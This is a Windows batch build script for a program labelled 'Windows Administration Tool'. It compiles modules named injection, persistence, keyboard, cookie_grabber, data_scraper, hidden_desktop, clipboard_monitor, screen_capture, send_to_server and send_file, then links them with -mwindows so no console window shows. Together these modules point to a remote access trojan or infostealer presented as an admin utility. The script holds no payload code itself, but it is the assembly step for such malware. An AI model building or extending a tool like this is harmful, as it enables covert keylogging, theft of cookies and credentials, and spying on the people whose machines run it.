@echo off
echo Compiling Windows Administration Tool...
echo.

REM Change to the directory where this batch file is located
cd /d "%~dp0"

REM Use w64devkit (has DirectX headers) instead of old MinGW
SET "PATH=%~dp0w64devkit\w64devkit\bin;%PATH%"

REM Force use of w64devkit assembler (avoid 32-bit MinGW as.exe on system PATH)
SET "AS_BIN=%~dp0w64devkit\w64devkit\bin"

REM Compile individual source files
g++ -c injection.cpp -o injection.o -lpsapi -B "%AS_BIN%"
g++ -c persistence.cpp -o persistence.o -ladvapi32 -B "%AS_BIN%"
g++ -c keyboard.cpp -o keyboard.o -luser32 -B "%AS_BIN%"
g++ -c utils.cpp -o utils.o -lpsapi -B "%AS_BIN%"
g++ -c exec_command.cpp -o exec_command.o -B "%AS_BIN%"
g++ -c send_to_server.cpp -o send_to_server.o -B "%AS_BIN%"
g++ -c send_file.cpp -o send_file.o -B "%AS_BIN%"
g++ -c screen_capture.cpp -o screen_capture.o -lgdi32 -lgdiplus -ld3d11 -ldxgi -B "%AS_BIN%"
g++ -c file_browser.cpp -o file_browser.o -B "%AS_BIN%"
g++ -c process_utils.cpp -o process_utils.o -lpsapi -B "%AS_BIN%"
g++ -c cookie_grabber.cpp -o cookie_grabber.o -lshlwapi -B "%AS_BIN%"
g++ -c data_scraper.cpp -o data_scraper.o -std=c++17 -lwininet -lole32 -lwindowscodecs -lgdi32 -B "%AS_BIN%"
g++ -c hidden_desktop.cpp -o hidden_desktop.o -luser32 -lwtsapi32 -B "%AS_BIN%"
g++ -c clipboard_monitor.cpp -o clipboard_monitor.o -std=c++17 -B "%AS_BIN%"
g++ -c window_monitor.cpp -o window_monitor.o -std=c++17 -lgdi32 -lgdiplus -B "%AS_BIN%"
g++ -c main.cpp -o main.o -I. -lpsapi -B "%AS_BIN%"

REM Compile the application manifest
windres app.rc -O coff -o app.res

REM Link everything together with all required libraries
REM -mwindows flag: GUI subsystem (no console window appears)
g++ -o myapp.exe app.res main.o injection.o persistence.o keyboard.o utils.o exec_command.o send_to_server.o send_file.o screen_capture.o file_browser.o process_utils.o cookie_grabber.o data_scraper.o hidden_desktop.o clipboard_monitor.o window_monitor.o -lpsapi -ladvapi32 -luser32 -lkernel32 -lws2_32 -lgdi32 -lgdiplus -ld3d11 -ldxgi -lshlwapi -lole32 -lwininet -lwindowscodecs -lwtsapi32 -lcrypt32 -static -std=c++17 -mwindows


echo.
echo Compilation complete!
echo Executable: myapp.exe
echo.
pause
